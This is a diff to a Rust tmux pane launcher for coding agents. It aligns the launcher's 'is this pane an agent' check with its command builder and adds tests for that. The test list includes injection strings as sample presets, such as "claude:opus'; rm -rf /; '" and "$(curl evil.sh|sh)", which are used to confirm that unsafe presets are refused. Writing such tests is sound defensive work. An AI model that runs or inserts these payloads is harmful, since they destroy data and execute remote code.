@@ -192,20 +192,31 @@ pub fn preset_command_with_hooks(
 
 /// Whether a pane running `preset` is an agent this runner dispatched.
 ///
-/// Two names are not, and everything else is. `shell` is a person's own
-/// prompt and `changes` is a rectangle holding a diff — nobody dispatched
-/// either of them to work a ticket, and a person typing `farcooler task note`
-/// into their own shell is a person. Everything else launches a coding agent,
-/// including a preset from a user-configured adapter this build has never
-/// heard of, which is why the test is a list of what is NOT one: a new agent
-/// arrives as a name nobody here can enumerate, and it must be named
-/// correctly the day it does.
+/// **Three ways to not be one, and everything else is.** `shell` is a
+/// person's own prompt and `changes` is a rectangle holding a diff — nobody
+/// dispatched either to work a ticket, and a person typing
+/// `farcooler task note` into their own shell is a person. The third is the
+/// one that is easy to miss: a preset that is not a plain identifier reaches
+/// `preset_command_with_hooks`'s final arm and is NOT RUN — that pane gets
+/// `{shell} -il`, a login shell, exactly like `shell` does. Left out, a
+/// preset with a space in it would have put a person at a prompt and told the
+/// board an agent was typing, which is item 1's own failure with the two
+/// names swapped.
 ///
-/// The head of the preset, so that `claude:opus` is still `claude` — the same
-/// split `preset_command_with_hooks` makes on the same string.
+/// Stated as what is not an agent rather than as a list of what is, because a
+/// preset from a user-configured adapter is a name this build cannot
+/// enumerate and has to be named correctly the day it arrives.
+///
+/// **This function and `preset_command_with_hooks` have to agree**, and the
+/// agreement is the thing worth checking rather than either half: true here
+/// must mean that builder launched a named program, false must mean it
+/// launched this person's shell or the changes host. `is_safe_model` is the
+/// same gate its `other if …` arm uses, and the head split is the same split,
+/// so `claude:opus` is `claude` on both sides. See
+/// `a_pane_is_named_an_agent_exactly_when_one_was_launched_in_it`.
 fn preset_runs_an_agent(preset: &str) -> bool {
     let head = preset.split_once(':').map(|(a, _)| a).unwrap_or(preset);
-    head != "shell" && head != CHANGES_PRESET
+    head != "shell" && head != CHANGES_PRESET && is_safe_model(head)
 }
 
 /// The launch, plus the name the pane files its board writes under.
@@ -217,13 +228,19 @@ fn preset_runs_an_agent(preset: &str) -> bool {
 /// around said "a person" for every agent on the runner, and nothing anywhere
 /// said otherwise. See `farcooler_core::pane_env` for the other end.
 ///
-/// `env` rather than a bare `NAME=value` prefix, and that is load-bearing
-/// rather than stylistic. tmux hands a one-argument command to the pane's
-/// `default-shell`, which `TmuxServer`'s managed config pins to the user's own
-/// login shell — and fish, which is somebody's login shell, does not have the
-/// prefix form at all. `env` is a program, so every shell runs it the same
-/// way. It `exec`s its target, so no extra process is left behind and
-/// `pane_current_command` reports exactly what it did before.
+/// `env` rather than a bare `NAME=value` prefix. tmux hands a one-argument
+/// command to the pane's `default-shell`, which `TmuxServer`'s managed config
+/// pins to whatever the user's login shell happens to be — so the prefix form
+/// would make this line depend on a SHELL feature rather than on a program.
+/// Every POSIX shell has it and fish has had it since 3.1, but fish before
+/// that did not, and neither this function nor `login_shell()` knows which
+/// shell or which version it is about to be parsed by. `env` is a binary and
+/// runs the same way under all of them.
+///
+/// It `exec`s its target — measured, not assumed: the child of a pane started
+/// this way reports the target's own name, so `pane_current_command`, which is
+/// what `Registry::rules_for_command` identifies an agent from, reads exactly
+/// what it read before this existed.
 ///
 /// Nothing is quoted because nothing here needs it: a uuid is thirty-six
 /// characters of hex and dashes, and `command` was already built to be handed
@@ -4640,6 +4657,130 @@ mod pane_actor_tests {
         );
 
         let _ = svc.stop_terminal(term.id).await;
+    }
+
+    /// The predicate and the builder agree, preset by preset.
+    ///
+    /// Neither half is interesting alone, and testing them apart is how three
+    /// branches went unguarded: `preset_runs_an_agent` could return true for a
+    /// preset `preset_command_with_hooks` refuses to run, and the seven
+    /// end-to-end tests below would all still pass because none of them uses
+    /// such a preset. What has to hold is the EQUIVALENCE -- a pane is named
+    /// an agent exactly when a named program was put in it -- so that is what
+    /// is asserted, over every shape of preset this daemon can be handed.
+    ///
+    /// The two commands that are not an agent are spelled out rather than
+    /// pattern-matched: a person's login shell, and the changes host. Anything
+    /// else the builder emits is a program somebody dispatched.
+    #[test]
+    fn a_pane_is_named_an_agent_exactly_when_one_was_launched_in_it() {
+        let a_persons_shell = format!("{} -il", farcooler_core::shell::login_shell());
+        let the_changes_host = changes_host_command();
+
+        for preset in [
+            // Agents, including one from an adapter this build never heard of.
+            "claude",
+            "codex",
+            "cursor",
+            "aider",
+            "claude:opus",
+            "codex:gpt-5.6-sol",
+            // A model that is not an identifier is dropped, but claude still
+            // runs -- so this is still an agent pane.
+            "claude:opus'; rm -rf /; '",
+            // A person's prompt, with and without a suffix.
+            "shell",
+            "shell:zsh",
+            // The diff rectangle, with and without a suffix.
+            CHANGES_PRESET,
+            "changes:anything",
+            // Presets that reach the builder's final arm and are NOT RUN. The
+            // pane gets a login shell, so the person at it is a person.
+            "a b",
+            "$(curl evil.sh|sh)",
+            "claude opus",
+        ] {
+            let command = preset_command_with_hooks(preset, None, None);
+            let launched_an_agent =
+                command != a_persons_shell && command != the_changes_host;
+            assert_eq!(
+                preset_runs_an_agent(preset),
+                launched_an_agent,
+                "{preset:?} runs {command:?}, which the two halves disagree about"
+            );
+        }
+    }
+
+    /// A pane holding a diff is not an agent either.
+    ///
+    /// The `changes` half of the rule, through a real launch rather than only
+    /// through the predicate: nobody dispatched a rectangle to work a ticket,
+    /// and `farcooler pane-host` has no board writes to file.
+    #[tokio::test]
+    async fn a_changes_pane_names_no_agent() {
+        let (_dir, svc, ws) = a_workspace().await;
+        let term = svc
+            .create_terminal(ws.id, "diff", CHANGES_PRESET)
+            .await
+            .expect("a changes pane");
+
+        let command = pane_start_command(&svc, term.id).await;
+        assert!(command.contains("pane-host"), "this is the changes host: {command}");
+        assert!(
+            !command.contains(farcooler_core::pane_env::ACTOR),
+            "a pane holding a diff names no agent: {command}"
+        );
+    }
+
+    /// A preset carrying a model is still the agent it names.
+    ///
+    /// The head split, through a real launch. Dropping it would leave
+    /// `claude:opus` compared whole against `shell`, which happens to give the
+    /// right answer here and the wrong one for `shell:zsh` -- which is why the
+    /// equivalence test above carries both.
+    #[tokio::test]
+    async fn an_agent_pane_with_a_model_still_names_itself() {
+        let (_dir, svc, ws) = a_workspace().await;
+        let term = svc
+            .create_terminal(ws.id, "agent", "claude:opus")
+            .await
+            .expect("a claude pane");
+
+        let command = pane_start_command(&svc, term.id).await;
+        assert!(command.contains("claude --model opus"), "the preset ran: {command}");
+        assert!(
+            command.contains(&expected(term.id)),
+            "and it is an agent pane like any other: {command}"
+        );
+    }
+
+    /// A preset the builder will not run leaves a person at a prompt, so the
+    /// board must not be told an agent is typing.
+    ///
+    /// The reverse of the failure item 1 exists to fix, and just as expensive.
+    /// `validate::command_preset` accepts any short ASCII string, so a preset
+    /// with a space in it reaches `preset_command_with_hooks`'s final arm and
+    /// gets a login shell -- and every `farcooler task note` somebody typed
+    /// into it would have filed under `agent:<this pane>`.
+    #[tokio::test]
+    async fn a_preset_that_is_never_run_leaves_a_person_at_the_prompt() {
+        let (_dir, svc, ws) = a_workspace().await;
+        let term = svc
+            .create_terminal(ws.id, "odd", "claude opus")
+            .await
+            .expect("an odd preset still opens a pane");
+
+        // tmux quotes a start command that has a space in it, so the quotes
+        // are trimmed before the tail is read rather than matched against.
+        let command = pane_start_command(&svc, term.id).await;
+        assert!(
+            command.trim_matches('"').ends_with(" -il"),
+            "the builder refused to run it and gave a login shell: {command}"
+        );
+        assert!(
+            !command.contains(farcooler_core::pane_env::ACTOR),
+            "a person at a prompt is a person: {command}"
+        );
     }
 
     /// A person's own prompt is a person, and `user` is what that means.
